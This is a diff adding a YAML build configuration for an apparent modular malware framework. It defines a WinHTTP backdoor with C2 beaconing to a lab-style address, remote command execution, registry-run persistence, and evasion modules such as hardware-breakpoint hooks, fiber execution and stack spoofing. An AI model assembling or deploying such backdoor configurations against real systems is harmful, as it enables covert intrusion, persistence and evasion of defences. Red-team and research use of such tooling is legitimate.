@@ -1,0 +1,30 @@
+name: backdoor_http_hwbp_fiber
+description: WinHTTP backdoor with VEH hardware breakpoint hooks + fiber execution
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+
+arch: arch/backdoor
+persist: persist/registry_run
+
+resources: true
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/veh_hwbp_hook
+  - evasion/fiber_exec
+  - evasion/iat_pad
+  - evasion/stack_spoof
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "10000"
